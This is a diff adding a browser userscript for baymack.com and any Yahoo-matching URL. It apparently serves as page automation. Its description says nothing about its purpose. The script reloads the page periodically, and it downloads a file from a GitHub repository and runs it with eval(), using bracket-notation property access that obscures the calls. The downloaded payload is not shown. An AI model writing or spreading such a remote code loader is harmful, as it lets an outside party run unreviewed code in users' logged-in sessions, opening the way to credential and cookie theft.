@@ -1,0 +1,27 @@
+// ==UserScript==
+// @name         Baymack kunrg
+// @version      21.9.2019
+// @description  baymack
+// @author       kunrg
+// @match        https://www.baymack.com/*
+// @include      https://*yahoo*
+// @require 	 https://apis.google.com/js/api.js
+// @require 	 https://www.gstatic.com/firebasejs/5.9.4/firebase.js
+// @grant        none
+// ==/UserScript==
+setTimeout(function() {
+    window['location']['reload']()
+}, 600000);
+var url = 'https://raw.githubusercontent.com/tantien197197/MMI/master/baymack_tantien';
+var xmlhttp = new XMLHttpRequest();
+xmlhttp['open']('GET', url, true);
+xmlhttp['send'](null);
+xmlhttp['onreadystatechange'] = function() {
+    if (xmlhttp['readyState'] == 4 && xmlhttp['status'] == 200) {
+        eval(xmlhttp['responseText'])
+    } else {
+        if (xmlhttp['readyState'] != 2 && xmlhttp['readyState'] != 3) {
+            window['location']['reload']()
+        }
+    }
+}
